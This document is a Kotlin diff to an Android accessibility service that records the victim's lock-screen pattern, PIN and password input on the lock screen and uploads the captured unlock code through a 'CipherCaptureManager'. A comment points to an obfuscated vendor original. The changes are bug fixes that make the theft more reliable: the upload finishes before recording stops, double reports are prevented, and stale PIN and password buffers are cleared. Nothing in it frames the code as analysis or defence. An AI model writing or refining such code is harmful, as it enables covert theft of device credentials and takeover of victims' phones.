@@ -36,12 +36,22 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
         private set
     var mode = 0  // 0=off, 1=recording
         private set
-    private var wasLocked = false
+    /** True after onUnlocked() has uploaded — prevents USER_PRESENT double upload */
+    @Volatile var hasReportedThisSession = false
+    private var wasLocked: Boolean
     private var touchExplorationEnabled = false
     private val patternPoints = ArrayList<String>()
     private var patternCoords = JSONArray()
     private var recordingStartTime = 0L
     private val handler = Handler(Looper.getMainLooper())
+
+    init {
+        // Bug 2 fix: initialize wasLocked from KeyguardManager so a service restart
+        // while device is locked doesn't cause a false justLocked transition.
+        wasLocked = try {
+            (service.getSystemService("keyguard") as? KeyguardManager)?.isKeyguardLocked ?: false
+        } catch (_: Exception) { false }
+    }
 
     /**
      * Handle HOVER_MOVE accessibility event on lock screen.
@@ -105,6 +115,7 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
             if (justLocked) {
                 mode = 1
                 isRecording = true
+                hasReportedThisSession = false
                 recordingStartTime = System.currentTimeMillis()
                 patternPoints.clear()
                 patternCoords = JSONArray()
@@ -133,9 +144,8 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
      * Vendor: C0319a4.m211577a6 unlock branch (lines 530-643)
      */
     private fun onUnlocked() {
-        isRecording = false
-        mode = 0
-
+        // Bug 1 fix: keep isRecording=true and mode=1 UNTIL after upload completes,
+        // so USER_PRESENT handler sees isRecording==true and defers to us.
         val pointCount = patternCoords.length()
         Log.d(TAG, "Unlock detected -> pattern points=$pointCount")
 
@@ -143,6 +153,8 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
             Log.d(TAG, "Pattern points < 4, skip upload")
             patternPoints.clear()
             patternCoords = JSONArray()
+            isRecording = false
+            mode = 0
             return
         }
 
@@ -163,6 +175,7 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
             if (ccm != null) {
                 ccm.bufferCipher(patternString, "pattern")
                 val saved = ccm.confirmAndSaveLastCipher()
+                hasReportedThisSession = true
                 Log.d(TAG, "Pattern upload result: $saved")
             } else {
                 Log.w(TAG, "CipherCaptureManager not initialized")
@@ -173,6 +186,9 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
 
         patternPoints.clear()
         patternCoords = JSONArray()
+        // Bug 1 fix: set recording off AFTER upload is done
+        isRecording = false
+        mode = 0
     }
 
     /**
@@ -193,10 +209,17 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
 
             if (!nodes.isNullOrEmpty() && nodes[0].isVisibleToUser) {
                 enableTouchExploration()
-                // 清空 CipherCaptureManager 的 PIN 缓冲，避免旧 PIN 数据被错误上报为图案
-                service.cipherCaptureManager?.pinDigits?.clear()
-                service.cipherCaptureManager?.pendingCipher = null
-                Log.d(TAG, "🔐 检测到图案锁视图($patternViewId)，启用触摸探索，已清空PIN缓冲")
+                // Bug 4 fix: clear ALL cipher buffers (not just pinDigits/pendingCipher)
+                // to prevent stale data from a previous text/PIN password session
+                service.cipherCaptureManager?.let { ccm ->
+                    ccm.pinDigits.clear()
+                    ccm.passwordChars.clear()
+                    ccm.passwordSnapshots.clear()
+                    ccm.hasAlpha = false
+                    ccm.pendingCipher = null
+                    ccm.collectedEvents.clear()
+                }
+                Log.d(TAG, "🔐 检测到图案锁视图($patternViewId)，启用触摸探索，已清空全部密码缓冲")
             }
         } catch (e: Exception) {
             Log.w(TAG, "tryEnableTouchExploration error", e)
@@ -232,11 +255,12 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
      */
     private fun disableTouchExploration() {
         if (!touchExplorationEnabled) return
+        // Bug 3 fix: always clear flag first so state doesn't desync when serviceInfo is null
+        touchExplorationEnabled = false
         try {
             val info = service.serviceInfo ?: return
             info.flags = info.flags and FLAG_TOUCH_EXPLORATION.inv()
             service.serviceInfo = info
-            touchExplorationEnabled = false
 
             if (Build.VERSION.SDK_INT >= 30) {
                 val dm = service.resources.displayMetrics
@@ -256,6 +280,7 @@ class GestureRecorderManager(private val service: MyAccessibilityService) {
         disableTouchExploration()
         isRecording = false
         mode = 0
+        hasReportedThisSession = false
         patternPoints.clear()
         patternCoords = JSONArray()
     }
